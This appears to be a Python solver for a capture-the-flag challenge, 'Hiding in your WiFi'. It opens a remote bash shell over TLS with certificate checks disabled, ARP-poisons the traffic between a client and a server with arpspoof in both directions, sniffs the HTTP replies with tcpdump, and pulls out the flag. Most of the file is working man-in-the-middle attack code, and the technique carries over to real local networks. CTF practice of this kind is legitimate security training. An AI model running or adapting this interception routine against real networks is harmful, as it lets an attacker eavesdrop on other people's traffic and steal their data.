#!/usr/bin/env python3
"""Solve Hiding in your WiFi by capturing the real client/server traffic."""

from __future__ import annotations

import argparse
import re
import shlex
import socket
import ssl
import uuid
from pathlib import Path
from time import monotonic


DEFAULT_HOST = "hiding-in-your-wifi-e61415beebbe.chall.nnsc.tf"
DEFAULT_PORT = 1337
CLIENT_IP = "10.10.10.20"
SERVER_IP = "10.10.10.10"
FLAG_RE = re.compile(r"\bNNS\{[^{}\r\n]+\}")


def extract_flag(capture: str) -> str:
    """Return the single NNS flag found in a focused tcpdump transcript."""

    candidates = set(FLAG_RE.findall(capture))
    if not candidates:
        raise RuntimeError("no NNS{...} flag found in the client/server capture")
    if len(candidates) != 1:
        found = ", ".join(sorted(candidates))
        raise RuntimeError(f"ambiguous NNS flags in capture: {found}")
    return candidates.pop()


def build_capture_command(seconds: int, marker: str) -> str:
    """Build the remote command that poisons ARP and captures only server replies."""

    if seconds < 1:
        raise ValueError("capture duration must be positive")

    capture_filter = (
        f"ip and src host {SERVER_IP} and dst host {CLIENT_IP} "
        "and tcp src port 80"
    )
    quoted_filter = shlex.quote(capture_filter)
    quoted_marker = shlex.quote(marker)
    return "\n".join(
        [
            "set +e",
            "cleanup() {",
            '  kill -INT "$poison_client" "$poison_server" 2>/dev/null',
            '  wait "$poison_client" "$poison_server" 2>/dev/null',
            "}",
            "trap cleanup EXIT",
            (
                "arpspoof -i eth0 -t "
                f"{CLIENT_IP} {SERVER_IP} >/dev/null 2>&1 &"
            ),
            "poison_client=$!",
            (
                "arpspoof -i eth0 -t "
                f"{SERVER_IP} {CLIENT_IP} >/dev/null 2>&1 &"
            ),
            "poison_server=$!",
            (
                f"timeout -s INT {seconds} tcpdump -l -nn -s0 -A "
                f"{quoted_filter} 2>&1"
            ),
            "capture_status=$?",
            "cleanup",
            "trap - EXIT",
            f"printf '\\n%s:%s\\n' {quoted_marker} \"$capture_status\"",
        ]
    )


class RemoteShell:
    """Small TLS-backed reader for the bash shell exposed by the challenge."""

    def __init__(self, host: str, port: int, connect_timeout: float = 10.0):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        raw_socket = socket.create_connection((host, port), timeout=connect_timeout)
        self.socket = context.wrap_socket(raw_socket, server_hostname=host)
        self.socket.settimeout(1.0)
        self._read_until_prompt(connect_timeout)

    def _read_until_prompt(self, timeout: float) -> bytes:
        """Consume the initial bash banner and prompt."""

        output = bytearray()
        deadline = monotonic() + timeout
        while monotonic() < deadline:
            try:
                chunk = self.socket.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                raise ConnectionError("remote shell closed before showing a prompt")
            output.extend(chunk)
            if re.search(rb"[#$] $", output):
                return bytes(output)
        raise TimeoutError("timed out waiting for the remote shell prompt")

    def run_capture(self, seconds: int) -> str:
        """Run the MITM capture and return all command output."""

        marker = f"__NNS_CAPTURE_DONE_{uuid.uuid4().hex}__"
        command = build_capture_command(seconds, marker)
        self.socket.sendall(command.encode() + b"\n")

        output = bytearray()
        deadline = monotonic() + seconds + 20
        marker_bytes = marker.encode()
        while monotonic() < deadline:
            try:
                chunk = self.socket.recv(8192)
            except socket.timeout:
                continue
            if not chunk:
                raise ConnectionError("remote shell closed before capture completed")
            output.extend(chunk)
            if marker_bytes in output:
                return bytes(output).decode("utf-8", errors="replace")
        raise TimeoutError("timed out waiting for tcpdump capture to complete")

    def close(self) -> None:
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.socket.close()


def solve(
    host: str = DEFAULT_HOST,
    port: int = DEFAULT_PORT,
    capture_seconds: int = 20,
    output_path: Path = Path("flag.txt"),
) -> str:
    """Capture the flag and write it to ``output_path``."""

    shell = RemoteShell(host, port)
    try:
        capture = shell.run_capture(capture_seconds)
    finally:
        shell.close()

    flag = extract_flag(capture)
    output_path.write_text(flag + "\n", encoding="utf-8")
    print(f"[+] Captured flag: {flag}")
    print(f"[+] Saved flag to {output_path}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--capture-seconds", type=int, default=20)
    parser.add_argument("--output", type=Path, default=Path("flag.txt"))
    args = parser.parse_args()
    solve(args.host, args.port, args.capture_seconds, args.output)


if __name__ == "__main__":
    main()
